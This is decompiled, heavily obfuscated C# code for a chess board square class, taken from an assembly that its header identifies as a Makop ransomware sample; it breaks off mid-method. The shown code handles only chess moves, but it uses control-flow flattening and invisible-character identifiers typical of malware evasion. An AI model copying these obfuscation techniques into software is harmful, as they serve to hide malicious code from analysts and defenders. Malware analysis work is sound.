// Decompiled with JetBrains decompiler
// Type: SimpleChessApp.Game.Square
// Assembly: Gز, Version=2.159.0.0, Culture=neutral, PublicKeyToken=null
// MVID: 19F72CF4-8E17-4C69-9694-AAB2F68A841C
// Assembly location: C:\Users\Administrateur\Downloads\Bazaar.2021.01-msil\HEUR-Trojan-Ransom.MSIL.Makop.gen-315cc7a49fb61eb58200e4b8294fb4a7c58ef16bdf813f48fa8d114a9804258a.exe

using SimpleChessApp.Extras;
using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Drawing;
using System.Runtime.InteropServices;
using System.Threading;
using System.Windows.Forms;

namespace SimpleChessApp.Game
{
  [ToolboxItem(false)]
  public class Square : SimpleSquare
  {
    public int File;
    public int Rank;
    public string Name;
    public Board Board;
    private string msg;
    private IContainer components = (IContainer) null;

    public static event EventHandler Action
    {
      add
      {
        EventHandler eventHandler1 = Square.Action;
label_1:
        int num1 = -510480874;
        EventHandler comparand;
        while (true)
        {
          uint num2;
          switch ((num2 = (uint) (num1 ^ -1750775284)) % 4U)
          {
            case 0:
              goto label_1;
            case 1:
              goto label_3;
            case 2:
              comparand = eventHandler1;
              EventHandler eventHandler2 = (EventHandler) Square.\u206E​⁪‏‎‌‪‫‌‫‏‏‌‬⁪⁫⁯‮‮⁭‮​‮‏‌‮‌‌⁪‪⁫‭‍‍⁫‏​‭‮‍‮((Delegate) comparand, (Delegate) value);
              eventHandler1 = Interlocked.CompareExchange<EventHandler>(ref Square.Action, eventHandler2, comparand);
              num1 = -465450285;
              continue;
            case 3:
              int num3 = eventHandler1 != comparand ? -1706874258 : (num3 = -1099819551);
              num1 = num3 ^ (int) num2 * 2003743368;
              continue;
            default:
              goto label_6;
          }
        }
label_3:
        return;
label_6:;
      }
      remove
      {
        EventHandler eventHandler1 = Square.Action;
label_1:
        int num1 = 1826830820;
        EventHandler comparand;
        EventHandler eventHandler2;
        while (true)
        {
          uint num2;
          switch ((num2 = (uint) (num1 ^ 2010860149)) % 4U)
          {
            case 0:
              eventHandler1 = Interlocked.CompareExchange<EventHandler>(ref Square.Action, eventHandler2, comparand);
              int num3 = eventHandler1 == comparand ? -264778997 : (num3 = -1424095172);
              num1 = num3 ^ (int) num2 * -1224088689;
              continue;
            case 1:
              comparand = eventHandler1;
              eventHandler2 = (EventHandler) Square.\u206E⁯‪‎‏‬‌⁯‏⁭⁮‫‮‫‪⁬‍‫‬⁫‎⁭⁭‫‬⁮‭‫⁯‌⁭​‭‍‎‏⁪⁯⁮‎‮((Delegate) comparand, (Delegate) value);
              num1 = 1551838941;
              continue;
            case 2:
              goto label_3;
            case 3:
              goto label_1;
            default:
              goto label_6;
          }
        }
label_3:
        return;
label_6:;
      }
    }

    public string SpecialName => Square.\u206D‫‮‏‍‮‌⁬⁭‬‬⁯⁫‫‏‎‍⁬‫‬‪‭⁭‬⁪‬‍⁮‪‫‎‌⁮‬⁪‏‏‏⁯‍‮(this.CurrentSquare, \u003CModule\u003E.\u206B‮‎⁫⁮⁮‭‬⁭⁭⁭‮⁬‬‍‌‬‏⁮‪‪‏⁯‮‫‬‮‎​‫⁬⁮‪⁭⁪⁫⁪‍⁫‪‮<string>(3042758562U), Square.\u200D⁭‌‮‌‏‬​‏‪⁫‏‎⁮⁬‌‫⁪‎‎‮‮‭‏‪‪⁯‬‫⁫‫⁮⁬⁭‏‎‌‍⁫⁮‮((object) this.Piece));

    public string CurrentSquare
    {
      get
      {
label_1:
        int num1 = 1050684428;
        string currentSquare;
        while (true)
        {
          uint num2;
          switch ((num2 = (uint) (num1 ^ 2091637353)) % 3U)
          {
            case 0:
              goto label_1;
            case 1:
              currentSquare = Square.\u202A‌⁪‪⁭‎‎⁯‮‮⁫⁮⁮⁫⁭‍⁮⁫​⁫⁯⁯⁪⁯‌‍⁯​‭⁭‫‪‮⁫‌‪⁯‎‏‍‮(Square.\u202C‏‏⁯⁯⁬‫‬‬‏​‎‎‭⁯⁬⁫⁪⁮‬‭‍‌‫⁭‮‌‏⁯‭‮‍‍‍⁬‫‍⁯‭‪‮(\u003CModule\u003E.\u206B‮‎⁫⁮⁮‭‬⁭⁭⁭‮⁬‬‍‌‬‏⁮‪‪‏⁯‮‫‬‮‎​‫⁬⁮‪⁭⁪⁫⁪‍⁫‪‮<string>(2554175305U), this.File).ToString(), (this.Rank + 1).ToString());
              num1 = (int) num2 * 155234259 ^ -956247525;
              continue;
            default:
              goto label_4;
          }
        }
label_4:
        return currentSquare;
      }
    }

    public static void action(string msg)
    {
label_1:
      int num1 = 272969338;
      while (true)
      {
        uint num2;
        switch ((num2 = (uint) (num1 ^ 1361007012)) % 4U)
        {
          case 0:
            goto label_1;
          case 1:
            goto label_3;
          case 2:
            EventHandler action = Square.Action;
            if (action != null)
            {
              action((object) msg, (EventArgs) null);
              num1 = (int) num2 * -123039687 ^ 15954085;
              continue;
            }
            goto label_5;
          case 3:
            num1 = (int) num2 * 1380082618 ^ 773547715;
            continue;
          default:
            goto label_8;
        }
      }
label_3:
      return;
label_8:
      return;
label_5:;
    }

    public Square(int file, int rank, Board Board)
      : this()
    {
label_1:
      int num1 = 178549842;
      while (true)
      {
        uint num2;
        switch ((num2 = (uint) (num1 ^ 1261585951)) % 6U)
        {
          case 0:
            goto label_1;
          case 1:
            num1 = (int) num2 * -402270146 ^ 1147395693;
            continue;
          case 2:
            this.Board = Board;
            num1 = (int) num2 * -597646184 ^ 49785486;
            continue;
          case 3:
            num1 = (int) num2 * 1626975820 ^ 1173083406;
            continue;
          case 5:
            this.File = file;
            this.Rank = rank;
            num1 = (int) num2 * 821256067 ^ -111285928;
            continue;
          default:
            goto label_7;
        }
      }
label_7:
      this.Name = Square.\u202A‌⁪‪⁭‎‎⁯‮‮⁫⁮⁮⁫⁭‍⁮⁫​⁫⁯⁯⁪⁯‌‍⁯​‭⁭‫‪‮⁫‌‪⁯‎‏‍‮(Square.\u202C‏‏⁯⁯⁬‫‬‬‏​‎‎‭⁯⁬⁫⁪⁮‬‭‍‌‫⁭‮‌‏⁯‭‮‍‍‍⁬‫‍⁯‭‪‮(\u003CModule\u003E.\u200B​⁯⁯⁬‮​⁫⁪⁯⁬⁯‮‭‭⁫⁫⁮⁪⁪‌‏⁫‪⁫‍⁭‌⁯⁬⁭‮‏‪‪‏‫⁪‌‪‮<string>(1165716350U), file).ToString(), (this.Rank + 1).ToString());
    }

    public Square()
    {
label_1:
      int num1 = 371575067;
      while (true)
      {
        uint num2;
        switch ((num2 = (uint) (num1 ^ 1248599881)) % 5U)
        {
          case 0:
            this.Click += new EventHandler<MouseEventArgs>(this.Square_MouseClick);
            num1 = (int) num2 * 1486931642 ^ -1452018682;
            continue;
          case 1:
            this.InitializeComponent();
            num1 = (int) num2 * -317471253 ^ 731080265;
            continue;
          case 2:
            num1 = (int) num2 * 2098572753 ^ 1413891968;
            continue;
          case 3:
            goto label_1;
          case 4:
            goto label_3;
          default:
            goto label_7;
        }
      }
label_3:
      return;
label_7:;
    }

    private void SwitchPlayer()
    {
      if (this.Board.DisableTurns)
        return;
label_1:
      int num1 = -1551573501;
      bool flag;
      while (true)
      {
        uint num2;
        switch ((num2 = (uint) (num1 ^ -692783667)) % 8U)
        {
          case 0:
            this.Board.WhosPlaying = PieceColor.White;
            num1 = -198900082;
            continue;
          case 1:
            flag = this.Board.WhosPlaying == PieceColor.White;
            num1 = (int) num2 * -1309455084 ^ 1943981966;
            continue;
          case 2:
            goto label_10;
          case 3:
            num1 = -81250961;
            continue;
          case 4:
            goto label_1;
          case 5:
            this.Board.WhosPlaying = PieceColor.Black;
            num1 = (int) num2 * -2103828517 ^ 499321257;
            continue;
          case 6:
            num1 = (int) num2 * -1937957813 ^ 1522603694;
            continue;
          case 7:
            int num3 = flag ? 1202210433 : (num3 = 1823952196);
            num1 = num3 ^ (int) num2 * 74723039;
            continue;
          default:
            goto label_11;
        }
      }
label_10:
      return;
label_11:;
    }

    private bool getSide(Square x)
    {
label_1:
      int num1 = 1129890075;
      bool side;
      while (true)
      {
        uint num2;
        int num3;
        switch ((num2 = (uint) (num1 ^ 1233712434)) % 5U)
        {
          case 0:
            num3 = this.Board.WhosPlaying == x.Piece.Color ? 1 : 0;
            break;
          case 1:
            if (!this.Board.DisableTurns)
            {
              num1 = (int) num2 * -485165555 ^ 798783569;
              continue;
            }
            num3 = 1;
            break;
          case 3:
            num1 = (int) num2 * 647905490 ^ -191003336;
            continue;
          case 4:
            goto label_1;
          default:
            goto label_9;
        }
        side = num3 != 0;
        num1 = 422851438;
      }
label_9:
      return side;
    }

    private void Square_MouseClick(object sender, MouseEventArgs e)
    {
label_1:
      int num1 = 90786456;
      while (true)
      {
        uint num2;
        bool flag1;
        bool flag2;
        bool flag3;
        bool flag4;
        List<PossibleMoves> move;
        int num3;
        int num4;
        Square to;
        switch ((num2 = (uint) (num1 ^ 687393062)) % 78U)
        {
          case 0:
            this.Board.From.ClearHighLight();
            num1 = (int) num2 * -1238642852 ^ 267642029;
            continue;
          case 1:
            int num5;
            num1 = num5 = this.Board.DisableTurns ? 596916124 : (num5 = 2106433544);
            continue;
          case 2:
            num1 = (int) num2 * 1754418387 ^ -858499820;
            continue;
          case 3:
            this.Board.From.ClearHighLight();
            num1 = (int) num2 * 1615291249 ^ 613123462;
            continue;
          case 4:
            num1 = (int) num2 * 852386687 ^ -2076804909;
            continue;
          case 5:
            flag4 = to.Piece.Color != this.Board.From.Piece.Color;
            num1 = (int) num2 * 1760931185 ^ 337670309;
            continue;
          case 6:
            this.Board.From = (Square) null;
            num1 = (int) num2 * -16956717 ^ -1987679408;
            continue;
          case 7:
            this.Board.ShowPieceMoves(to);
            num1 = (int) num2 * 948669490 ^ 1213198506;
            continue;
          case 8:
            num1 = (int) num2 * -468184904 ^ 417463524;
            continue;
          case 9:
            num1 = 1618736936;
            continue;
          case 10:
            num1 = (int) num2 * -290188366 ^ 184492921;
            continue;
          case 11:
            to.HighLight();
            this.Board.From = to;
            this.msg = \u003CModule\u003E.\u206B‮‎⁫⁮⁮‭‬⁭⁭⁭‮⁬‬‍‌‬‏⁮‪‪‏⁯‮‫‬‮‎​‫⁬⁮‪⁭⁪⁫⁪‍⁫‪‮<string>(570312056U);
            this.Board.ShowPieceMoves(to);
            num1 = (int) num2 * 1553231786 ^ 1642726426;
            continue;
          case 12:
            num1 = (int) num2 * 1790698093 ^ -57545147;
            continue;
          case 13:
            num1 = 1275280761;
            continue;
          case 14:
            num1 = (int) num2 * 451174869 ^ 1466087112;
            continue;
          case 15:
            this.Board.From = to;
            num1 = (int) num2 * -201176522 ^ -22880373;
            continue;
          case 16:
            int num6 = Square.\u206D⁬⁮​⁬‍⁬‭⁫⁪‏⁭‪‮‏‬‏‎⁫⁬‪⁪‬‫‭⁯‏⁪​‍‌‮‭⁭⁭‍⁭​‫‭‮(e) == MouseButtons.Left ? -975756411 : (num6 = -1829134201);
            num1 = num6 ^ (int) num2 * -1990830367;
            continue;
          case 17:
            num1 = (int) num2 * -1246559852 ^ 1378079492;
            continue;
          case 18:
            goto label_1;
          case 19:
            this.msg = \u003CModule\u003E.\u206F‭‌⁭‍⁪‬‏⁭⁭‫⁬‬​‏‍‭‌​⁬‭‏‎⁭‎‪‏⁮⁫⁪‎⁮⁭⁬⁫‎‏‎‮‏‮<string>(1755660997U);
            int num7 = !this.Board.lights.MoveList[this.Board.From.Piece.Id].Exists((Predicate<PossibleMoves>) (t => t.Square == to)) ? 1647902304 : (num7 = 215208210);
            num1 = num7 ^ (int) num2 * 952384099;
            continue;
          case 20:
            num1 = (int) num2 * -1962277253 ^ -1892917760;
            continue;
          case 21:
            this.Board.From.ClearHighLight();
            to.CaptPawn(this.Board.From);
            num1 = (int) num2 * 1732206055 ^ -698717543;
            continue;
          case 22:
            num1 = (int) num2 * -125394267 ^ 1018066768;
            continue;
          case 23:
            num1 = (int) num2 * -1826379968 ^ -1675813522;
            continue;
          case 24:
            move = this.Board.lights.MoveList[this.Board.From.Piece.Id];
            this.msg = Square.\u206D‏‫⁭‫‎‭‎⁪⁯⁬​‫⁭‪‎⁬⁮‬​‎‌‬​‏‭‎⁭‏‌‬⁫‏⁯⁮‍⁫⁭⁮‫‮(\u003CModule\u003E.\u206B‮‎⁫⁮⁮‭‬⁭⁭⁭‮⁬‬‍‌‬‏⁮‪‪‏⁯‮‫‬‮‎​‫⁬⁮‪⁭⁪⁫⁪‍⁫‪‮<string>(747564524U), (object) move.Count);
            num1 = (int) num2 * -2115588946 ^ 103394224;
            continue;
          case 25:
            num1 = (int) num2 * -92278147 ^ 1617922030;
            continue;
          case 26:
            to.HighLight();
            num1 = (int) num2 * 1067239656 ^ -1569613031;
            continue;
          case 27:
            num1 = (int) num2 * -1363505868 ^ 432198015;
            continue;
          case 28:
            if (to.Piece != null)
            {
              num1 = 1214175081;
              continue;
            }
            num3 = 0;
            goto label_56;
          case 29:
            num1 = (int) num2 * 440638117 ^ 445651664;
            continue;
          case 30:
            this.msg = \u003CModule\u003E.\u200C⁯⁪‎⁮⁮‬⁫⁭‬⁫⁮⁪⁪⁭​‬⁯​‬‪‮‌‌⁫⁮⁮⁯‮‮‍‏‫⁭‮⁮⁫⁬⁬⁫‮<string>(2411488171U);
            num1 = (int) num2 * -770064042 ^ 761485553;
            continue;
          case 31:
            num1 = (int) num2 * 1157287034 ^ 1270609245;
            continue;
          case 32:
            this.hideMoves(this.Board.From);
            num1 = (int) num2 * 1185929050 ^ 511654325;
            continue;
          case 33:
            num1 = 1632077067;
            continue;
          case 34:
            num1 = (int) num2 * 598222129 ^ -273329166;
            continue;
          case 35:
            this.Board.From = to;
            num1 = (int) num2 * 904313233 ^ 1813143958;
            continue;
          case 36:
            num1 = 2089498851;
            continue;
          case 37:
            num1 = (int) num2 * 1401462194 ^ 1865329157;
            continue;
          case 38:
            num1 = 2089498851;
            continue;
          case 39:
            to.HighLight();
            num1 = (int) num2 * 1044133032 ^ 1291478197;
            continue;
          case 40:
            num1 = (int) num2 * 1333284966 ^ -1263255973;
            continue;
          case 41:
            this.Board.From.ClearHighLight();
            num1 = (int) num2 * 1697074511 ^ 250071648;
            continue;
          case 42:
            int num8;
            num1 = num8 = this.Board.From.Piece.Color != to.Piece.Color ? 817173475 : (num8 = 1480851194);
            continue;
          case 43:
            this.msg = \u003CModule\u003E.\u206F‭‌⁭‍⁪‬‏⁭⁭‫⁬‬​‏‍‭‌​⁬‭‏‎⁭‎‪‏⁮⁫⁪‎⁮⁭⁬⁫‎‏‎‮‏‮<string>(3800513984U);
            num1 = (int) num2 * -69029130 ^ -215816261;
            continue;
          case 44:
            int num9 = flag1 ? 1179392484 : (num9 = 1920421656);
            num1 = num9 ^ (int) num2 * 1409122242;
            continue;
          case 45:
            int num10 = move.Exists((Predicate<PossibleMoves>) (t => t.Square == to)) ? -1162783301 : (num10 = -1047208808);
            num1 = num10 ^ (int) num2 * -1757349267;
            continue;
          case 46:
            int num11;
            num1 = num11 = !this.getSide(this.Board.From) ? 1618736936 : (num11 = 1906701715);
            continue;
          case 47:
            to = this;
            num1 = (int) num2 * 494147820 ^ 1861667225;
            continue;
          case 48:
            num1 = (int) num2 * 1183840633 ^ 311738560;
            continue;
          case 49:
            this.Board.HidePieceMoves(this.Board.From);
            num1 = (int) num2 * 141076012 ^ 1193977180;
            continue;
          case 50:
            this.Board.ShowPieceMoves(to);
            num1 = (int) num2 * 826746229 ^ -528372408;
            continue;
          case 51:
            this.Board.ShowPieceMoves(to);
            num1 = (int) num2 * -645428693 ^ 139794267;
            continue;
          case 52:
            num1 = (int) num2 * 316005864 ^ 1225043618;
            continue;
          case 53:
            num1 = (int) num2 * 2124864584 ^ 1057760583;
            continue;
          case 54:
            goto label_3;
          case 55:
            flag1 = to.Piece == null & flag2;
            num1 = (int) num2 * -171361037 ^ -1402857451;
            continue;
          case 56:
            to.HighLight();
            num1 = (int) num2 * -1214347700 ^ -925402520;
            continue;
          case 57:
            this.msg = \u003CModule\u003E.\u200C⁯⁪‎⁮⁮‬⁫⁭‬⁫⁮⁪⁪⁭​‬⁯​‬‪‮‌‌⁫⁮⁮⁯‮‮‍‏‫⁭‮⁮⁫⁬⁬⁫‮<string>(3008724260U);
            num1 = (int) num2 * -145378549 ^ -304769624;
            continue;
          case 58:
            int num12 = !flag4 ? -614053432 : (num12 = -1128913321);
            num1 = num12 ^ (int) num2 * -1459027340;
            continue;
          case 59:
            num3 = this.getSide(to) ? 1 : 0;
            goto label_56;
          case 60:
            num1 = (int) num2 * 1751418957 ^ 1651832854;
            continue;
          case 61:
            to.MovePawn(this.Board.From);
            num1 = 531503811;
            continue;
          case 62:
            num1 = 186318217;
            continue;
          case 63:
            Square.action(this.msg);
            num1 = 902709460;
            continue;
          case 64:
            num1 = (int) num2 * 1594002001 ^ 290737464;
            continue;
          case 65:
            if (this.Board.From == null)
            {
              num4 = 0;
              break;
            }
            num1 = (int) num2 * -1730702540 ^ -1446641642;
            continue;
          case 66:
            int num13 = flag3 ? 952331627 : (num13 = 1186395290);
            num1 = num13 ^ (int) num2 * 1845872270;
            continue;
          case 67:
            this.msg = \u003CModule\u003E.\u206F‭‌⁭‍⁪‬‏⁭⁭‫⁬‬​‏‍‭‌​⁬‭‏‎⁭‎‪‏⁮⁫⁪‎⁮⁭⁬⁫‎‏‎‮‏‮<string>(1621406860U);
            num1 = (int) num2 * -707562701 ^ -466760853;
            continue;
          case 68:
            flag3 = flag2;
            num1 = 638521230;
            continue;
          case 69:
            num1 = (int) num2 * -82610156 ^ 1145884914;
            continue;
          case 70:
            num1 = (int) num2 * 763927952 ^ 1619722293;
            continue;
          case 71:
            num1 = (int) num2 * 306328768 ^ 570690322;
            continue;
          case 72:
            num1 = (int) num2 * -492538114 ^ -1727386460;
            continue;
          case 73:
            this.msg = \u003CModule\u003E.\u206B‮‎⁫⁮⁮‭‬⁭⁭⁭‮⁬‬‍‌‬‏⁮‪‪‏⁯‮‫‬‮‎​‫⁬⁮‪⁭⁪⁫⁪‍⁫‪‮<string>(3894934801U);
            num1 = 2089498851;
            continue;
          case 74:
            num4 = this.Board.From.Piece != null ? 1 : 0;
            break;
          case 75:
            int num14 = to.Piece.Id == this.Board.From.Piece.Id ? -1214409959 : (num14 = -98285316);
            num1 = num14 ^ (int) num2 * 791915324;
            continue;
          case 76:
            this.msg = \u003CModule\u003E.\u206F‭‌⁭‍⁪‬‏⁭⁭‫⁬‬​‏‍‭‌​⁬‭‏‎⁭‎‪‏⁮⁫⁪‎⁮⁭⁬⁫‎‏‎‮‏‮<string>(3255737203U);
            int num15 = this.Board.From.Piece.Kind == Pieces.Pawn ? 1673515383 : (num15 = 260563961);
            num1 = num15 ^ (int) num2 * -28016025;
            continue;
          case 77:
            this.hideMoves(this.Board.From);
            num1 = (int) num2 * 1805186205 ^ -1604368733;
            continue;
          default:
            goto label_86;
        }
        flag2 = num4 != 0;
        num1 = 2116683393;
        continue;
label_56:
        int num16;
        num1 = num16 = num3 != 0 ? 251336991 : (num16 = 294887753);
      }
label_3:
      return;
label_86:;
    }

    private void hideMoves(Square to)
    {
label_1:
      int num1 = 32071229;
      while (true)
      {
        uint num2;
        switch ((num2 = (uint) (num1 ^ 1653071611)) % 8U)
        {
          case 0:
            this.Board.From.ClearHighLight();
            num1 = (int) num2 * 1231320218 ^ 1735530681;
            continue;
          case 1:
            num1 = (int) num2 * -1005291083 ^ -798740459;
            continue;
          case 2:
            num1 = (int) num2 * 1376380466 ^ -28812870;
            continue;
          case 3:
            goto label_3;
          case 4:
            num1 = (int) num2 * 767240265 ^ -909660569;
            continue;
          case 5:
            this.Board.HidePieceMoves(to);
            num1 = (int) num2 * 963825379 ^ -238753515;
            continue;
          case 6:
            int num3 = this.Board.From == null ? -467644050 : (num3 = -740636055);
            num1 = num3 ^ (int) num2 * 697744125;
            continue;
          case 7:
            goto label_1;
          default:
            goto label_10;
        }
      }
label_3:
      return;
label_10:;
    }

    private void CaptPawn(Square from)
    {
label_1:
      int num1 = 1121263905;
      while (true)
      {
        uint num2;
        bool flag1;
        bool flag2;
        bool flag3;
        bool flag4;
        bool flag5;
        int num3;
        int num4;
        switch ((num2 = (uint) (num1 ^ 995243492)) % 32U)
        {
          case 0:
            this.Board.BlackPieces[this.Piece.Id].Current = this;
            num1 = (int) num2 * -227627734 ^ 533065094;
            continue;
          case 1:
            this.Board.WhitePieces[from.Piece.Id].Current = this;
            num1 = (int) num2 * -1289114717 ^ -87018381;
            continue;
          case 2:
            this.handleBlackCastling();
            num1 = (int) num2 * -575057300 ^ 54330192;
            continue;
          case 3:
            this.Board.BlackPieces[from.Piece.Id].Current = this;
            num1 = 2008283280;
            continue;
          case 4:
            int num5 = flag2 ? -62716255 : (num5 = -334925607);
            num1 = num5 ^ (int) num2 * 951097018;
            continue;
          case 5:
            int num6 = this.Piece.Color == PieceColor.White ? -1358084580 : (num6 = -1017582684);
            num1 = num6 ^ (int) num2 * 1492805008;
            continue;
          case 6:
            int num7 = !flag3 ? 965399825 : (num7 = 588322802);
            num1 = num7 ^ (int) num2 * 1422531850;
            continue;
          case 7:
            num3 = this.Piece.Current.Rank == 0 ? 1 : 0;
            goto label_28;
          case 8:
            this.Board.WhitePieces.Remove(this.Piece.Id);
            num1 = (int) num2 * 967146616 ^ -900081001;
            continue;
          case 9:
            from.Piece = (ChessPiece) null;
            num1 = 1378081075;
            continue;
          case 10:
            num1 = (int) num2 * 1073971302 ^ -2146312520;
            continue;
          case 11:
            num1 = 2037943793;
            continue;
          case 12:
            if (this.Piece.Kind == Pieces.Pawn)
            {
              num1 = (int) num2 * 835240873 ^ -1609516433;
              continue;
            }
            num3 = 0;
            goto label_28;
          case 13:
            this.Board.WhitePieces[this.Piece.Id].Current = this;
            num1 = (int) num2 * -718036977 ^ 958085206;
            continue;
          case 14:
            num1 = 1243905069;
            continue;
          case 15:
            if (flag4)
            {
              num1 = (int) num2 * -898077881 ^ -1618634369;
              continue;
            }
            goto label_55;
          case 16:
            this.Board.BlackPieces.Remove(this.Piece.Id);
            num1 = 1132829554;
            continue;
          case 17:
            this.handleWhiteCastling();
            num1 = (int) num2 * 288228466 ^ -2112071896;
            continue;
          case 18:
            num1 = (int) num2 * 1671590458 ^ -1684901969;
            continue;
          case 19:
            num1 = (int) num2 * -695679640 ^ -2084154166;
            continue;
          case 20:
            this.Piece = from.Piece;
            flag4 = false;
            flag1 = this.Piece.Color == PieceColor.White;
            num1 = 595058969;
            continue;
          case 21:
            flag3 = this.Piece.Color == PieceColor.Black;
            num1 = 2143357538;
            continue;
          case 22:
            flag5 = from.Piece.Color == PieceColor.White;
            num1 = 1746019071;
            continue;
          case 23:
            num1 = (int) num2 * -1091852004 ^ -691298321;
            continue;
          case 24:
            num4 = this.Piece.Current.Rank == 7 ? 1 : 0;
            break;
          case 25:
            flag4 = true;
            num1 = (int) num2 * -144705528 ^ 478513122;
            continue;
          case 26:
            flag4 = true;
            num1 = (int) num2 * 199839986 ^ 381154651;
            continue;
          case 27:
            int num8 = flag5 ? -2087978256 : (num8 = -1710161262);
            num1 = num8 ^ (int) num2 * 393157839;
            continue;
          case 28:
            goto label_1;
          case 29:
            flag2 = flag1;
            num1 = (int) num2 * 1511530414 ^ -1610846026;
            continue;
          case 30:
            if (this.Piece.Kind != Pieces.Pawn)
            {
              num4 = 0;
              break;
            }
            num1 = (int) num2 * -845921197 ^ 1362435366;
            continue;
          default:
            goto label_40;
        }
        int num9;
        num1 = num9 = num4 != 0 ? 447540094 : (num9 = 371161295);
        continue;
label_28:
        int num10;
        num1 = num10 = num3 == 0 ? 338582058 : (num10 = 1307312477);
      }
label_40:
      Promotion promotion = new Promotion(Square.\u202D‮⁬‪‍⁮‮‫⁬⁫‬⁮⁭⁭‭​⁪⁮‎‮​⁫⁫⁭‬⁬‌⁯‏⁮⁪⁬⁫⁫‎‫‎​‎‌‮());
      try
      {
label_42:
        int num11 = 942274859;
        while (true)
        {
          uint num12;
          switch ((num12 = (uint) (num11 ^ 995243492)) % 4U)
          {
            case 0:
              goto label_42;
            case 2:
              num11 = (int) num12 * -186841130 ^ 286622713;
              continue;
            case 3:
              int num13 = (int) Square.\u206B⁭‮‌‫​‮‏⁮‬‫⁮⁯⁬⁯‏‮‪‏‮‏‎‎⁯‬‌‮⁬⁬⁫‭‌‫‮⁪‬⁭⁭⁬‮‮((Form) promotion);
              this.Kind = promotion.Piece;
              num11 = (int) num12 * 818119516 ^ 204355610;
              continue;
            default:
              goto label_52;
          }
        }
      }
      finally
      {
        if (promotion != null)
        {
label_47:
          int num14 = 2001415285;
          while (true)
          {
            uint num15;
            switch ((num15 = (uint) (num14 ^ 995243492)) % 4U)
            {
              case 0:
                num14 = (int) num15 * 1570416697 ^ -639327093;
                continue;
              case 1:
                Square.\u202B‫‫⁬⁮‫‭⁮‎⁬‪‮‬‎⁭⁬⁫⁪⁮‏‮⁯‪‭‌‮‭‍‬​‮‭‏‎‪‮‭‌​‮‮((IDisposable) promotion);
                num14 = (int) num15 * 1706003386 ^ -1197410350;
                continue;
              case 2:
                goto label_47;
              default:
                goto label_51;
            }
          }
        }
label_51:;
      }
label_52:
label_53:
      int num16 = 461608177;
label_54:
      while (true)
      {
        uint num17;
        switch ((num17 = (uint) (num16 ^ 995243492)) % 4U)
        {
          case 0:
            goto label_53;
          case 1:
            goto label_55;
          case 2:
            PlaySound.Play();
            num16 = (int) num17 * 1204735551 ^ -405753735;
            continue;
          default:
            goto label_57;
        }
      }
label_57:
      this.SwitchPlayer();
      return;
label_55:
      this.Board.lights.FindAllMoves();
      num16 = 1482546646;
      goto label_54;
    }

    private void MovePawn(Square from)
    {
      ChessPiece chessPiece = (ChessPiece) null;
      this.Piece = from.Piece;
label_1:
      int num1 = 1213602256;
      bool flag1;
      while (true)
      {
        uint num2;
        bool flag2;
        bool flag3;
        bool flag4;
        bool flag5;
        int num3;
        int num4;
        int num5;
        switch ((num2 = (uint) (num1 ^ 1957729796)) % 31U)
        {
          case 0:
            this.Board.BlackPieces[this.Piece.Id].Current = this;
            num1 = (int) num2 * -532383843 ^ -1828216780;
            continue;
          case 1:
            chessPiece = this.handleBlackCastling();
            num1 = (int) num2 * -38862559 ^ 1690197524;
            continue;
          case 2:
            num1 = 132550731;
            continue;
          case 3:
            flag4 = true;
            num1 = (int) num2 * 1487922291 ^ -1195479123;
            continue;
          case 4:
            chessPiece = this.handleWhiteCastling();
            num1 = (int) num2 * -1465002745 ^ -666117889;
            continue;
          case 5:
            goto label_1;
          case 6:
            num3 = this.Piece.Current.Rank == 7 ? 1 : 0;
            goto label_39;
          case 7:
            int num6 = !flag3 ? 1947619532 : (num6 = 1351050107);
            num1 = num6 ^ (int) num2 * -868571640;
            continue;
          case 8:
            int num7 = flag2 ? -1613370807 : (num7 = -1352550596);
            num1 = num7 ^ (int) num2 * -1932347707;
            continue;
          case 9:
            num1 = 2141365179;
            continue;
          case 10:
            num1 = 1691414781;
            continue;
          case 11:
            num1 = (int) num2 * -14008893 ^ -1481297581;
            continue;
          case 12:
            int num8 = !flag5 ? 1982670565 : (num8 = 116360342);
            num1 = num8 ^ (int) num2 * 643280917;
            continue;
          case 13:
            if (this.Piece.Kind == Pieces.Pawn)
            {
              num1 = (int) num2 * -1352516402 ^ -4236986;
              continue;
            }
            num4 = 0;
            break;
          case 14:
            num1 = (int) num2 * -1685014616 ^ 1900978186;
            continue;
          case 15:
            this.Board.WhitePieces[this.Piece.Id].Current = this;
            num1 = (int) num2 * 1147659360 ^ 1908067840;
            continue;
          case 16:
            if (this.Rank != 3)
            {
              num1 = (int) num2 * 628586585 ^ -1283826129;
              continue;
            }
            num5 = 1;
            goto label_25;
          case 17:
            this.Board.lastPassantPawn = (ChessPiece) null;
            int num9 = this.Piece.Kind != Pieces.Pawn ? -943032747 : (num9 = -1875532530);
            num1 = num9 ^ (int) num2 * -449078590;
            continue;
          case 18:
            flag4 = true;
            num1 = (int) num2 * 1408083369 ^ 2002098475;
            continue;
          case 19:
            num1 = (int) num2 * 206232113 ^ 2130241965;
            continue;
          case 21:
            from.Piece = (ChessPiece) null;
            num1 = 1965992480;
            continue;
          case 22:
            num4 = this.Piece.Current.Rank == 0 ? 1 : 0;
            break;
          case 23:
            flag2 = flag1;
            num1 = (int) num2 * 1906863419 ^ 1454184850;
            continue;
          case 24:
            this.Board.lastPassantPawn = this.Piece;
            num1 = (int) num2 * 434681699 ^ 626194424;
            continue;
          case 25:
            flag4 = false;
            flag1 = this.Piece.Color == PieceColor.White;
            num1 = 1723126948;
            continue;
          case 26:
            num1 = (int) num2 * -1523878932 ^ -2101646085;
            continue;
          case 27:
            if (this.Piece.Kind == Pieces.Pawn)
            {
              num1 = (int) num2 * 1683883040 ^ 1418099802;
              continue;
            }
            num3 = 0;
            goto label_39;
          case 28:
            if (flag4)
            {
              num1 = (int) num2 * 1291760676 ^ -1965850605;
              continue;
            }
            goto label_92;
          case 29:
            num1 = 2141365179;
            continue;
          case 30:
            num5 = this.Rank == 4 ? 1 : 0;
            goto label_25;
          default:
            goto label_42;
        }
        flag5 = num4 != 0;
        num1 = 1679365735;
        continue;
label_25:
        int num10;
        num1 = num10 = num5 != 0 ? 1883965400 : (num10 = 1220500460);
        continue;
label_39:
        flag3 = num3 != 0;
        num1 = 1161925499;
      }
label_42:
      Promotion promotion = new Promotion(Square.\u202D‮⁬‪‍⁮‮‫⁬⁫‬⁮⁭⁭‭​⁪⁮‎‮​⁫⁫⁭‬⁬‌⁯‏⁮⁪⁬⁫⁫‎‫‎​‎‌‮());
      try
      {
